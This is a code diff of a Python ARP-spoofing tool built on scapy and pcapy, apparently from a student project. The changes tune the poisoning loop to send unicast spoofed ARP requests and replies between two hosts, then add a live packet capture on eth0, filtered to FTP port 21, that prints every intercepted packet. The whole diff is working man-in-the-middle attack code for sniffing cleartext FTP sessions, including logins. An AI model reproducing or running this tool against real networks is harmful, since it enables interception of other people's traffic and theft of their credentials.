@@ -28,13 +28,13 @@ class Spoofer(threading.Thread):
 
         def run(self):
             ''' Spoofing done every X seconds'''
-            seconds_to_spoof = 1
+            seconds_to_spoof = 30
             while not self.event.is_set():
                 print("ARP spoofing", flush=True) # Spoof
-                self.event.wait(seconds_to_spoof)
                 Spoofer.SpooferRefresh.ft_spoof(self.ip_src, self.ip_dst,  self.mac_dst)
                 Spoofer.SpooferRefresh.ft_spoof(self.ip_dst, self.ip_src,  self.mac_src)
                 print("", end="", flush=True)
+                self.event.wait(seconds_to_spoof)
             # Restore
             Spoofer.SpooferRefresh.ft_restore(self.ip_dst, self.mac_dst, self.ip_src,  self.mac_src)
             Spoofer.SpooferRefresh.ft_restore(self.ip_src, self.mac_src, self.ip_dst,  self.mac_dst)
@@ -42,13 +42,13 @@ class Spoofer(threading.Thread):
 
 
         def ft_spoof(ip_origin, ip_dest, mac_dest):
-            scapy.sendp((scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(op=1, pdst = ip_dest, hwdst= mac_dest, psrc=ip_origin)))
+            scapy.sendp((scapy.Ether(dst=mac_dest) / scapy.ARP(op=1, pdst = ip_dest, hwdst= mac_dest, psrc=ip_origin)))
             scapy.send(scapy.ARP(op = 2,
                                 pdst = ip_dest, hwdst = mac_dest, 
                                 psrc = ip_origin), verbose = True)
             
         def ft_restore(ip_origin, mac_origin, ip_dest, mac_dest):
-            scapy.sendp((scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(op=1, pdst = ip_dest, hwdst= mac_dest, psrc=ip_origin)))
+            scapy.sendp((scapy.Ether(dst=mac_dest) / scapy.ARP(op=1, pdst = ip_dest, hwdst= mac_dest, psrc=ip_origin)))
             scapy.send(scapy.ARP(op = 2,
                                 pdst = ip_dest, hwdst = mac_dest, 
                                 psrc = ip_origin, hwsrc = mac_origin), verbose = True)
@@ -69,11 +69,12 @@ class Spoofer(threading.Thread):
 
     def run(self):
         self.spoofer_refresher.start()
-        promiscuous = True
-        network_device = pcapy.lookupdev()
-        p = pcapy.open_live(network_device, 2000, promisc=True, to_ms=1000)
+        pcap_listener = pcapy.open_live("eth0", 2000, True, 1000)
+        pcap_listener.setfilter("port 21")
         while not self.event.is_set():
-            signal.pause()
+            next_packet = pcap_listener.next()
+            print(f"Header {next_packet[0]}", flush=True)
+            print(f'Packet content {next_packet[1]}', flush=True)
         self.spoofer_refresher.join()
 
 
